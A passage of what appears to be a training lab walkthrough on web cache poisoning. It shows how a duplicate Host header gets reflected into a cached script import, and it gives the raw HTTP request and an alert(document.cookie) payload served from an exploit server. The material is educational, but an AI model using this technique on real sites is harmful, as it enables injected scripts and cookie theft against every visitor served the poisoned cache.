### Web cache poisoning via ambiguous requests

serve as a cache buster, for example, ```GET /?cb=123```. You can simply change this parameter each time you want a fresh response from the back-end server.
Notice that if you add a second Host header with an arbitrary value, this appears to be ignored when validating and routing your request. Crucially, notice that the arbitrary value of your second Host header is reflected in an absolute URL used to import a script from /resources/js/tracking.js.
Remove the second Host header and send the request again using the same cache buster. Notice that you still receive the same cached response containing your injected value.
Go to the exploit server and create a file at ``` /resources/js/tracking.js``` containing the payload ```alert(document.cookie)```. Store the exploit and copy the domain name for your exploit server.
Back in Burp Repeater, add a second Host header containing your exploit server domain name. The request should look something like this:

```
GET /?cb=123 HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```
Send the request a couple of times until you get a cache hit with your exploit server URL reflected in the response. To simulate the victim, request the page in the browser using the same cache buster in the URL. Make sure that the alert() fires.
